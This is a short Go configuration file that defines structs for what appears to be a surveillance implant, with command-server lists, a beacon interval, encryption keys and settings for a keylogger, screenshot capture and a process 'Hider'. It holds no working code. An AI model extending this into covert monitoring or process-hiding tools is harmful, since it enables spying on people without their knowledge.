package config

type InstallationConfig struct {
	DBPath     string `yaml:"DBPath"`
	DBPassword string `yaml:"DBPassword"`
	AESKey     string `yaml:"AESKey"`
}

type ServerConfig struct {
	Address string `yaml:"Address"`
	Port    int    `yaml:"Port"`
	Key     string `yaml:"Key"`
}

type CommunicationConfig struct {
	Interval    string         `yaml:"Interval"`
	Servers     []ServerConfig `yaml:"Servers"`
	Certificate string         `yaml:"Certificate"`
}

type HiderConfig struct {
	NewProcessName string `yaml:"NewProcessName"`
}

type AppsConfig struct {
	Keylogger     map[string]any `yaml:"Keylogger,omitempty"`
	Screenshot    map[string]any `yaml:"Screenshot,omitempty"`
	SecurityGuard map[string]any `yaml:"SecurityGuard,omitempty"`
	Hider         HiderConfig    `yaml:"Hider,omitempty"`
}
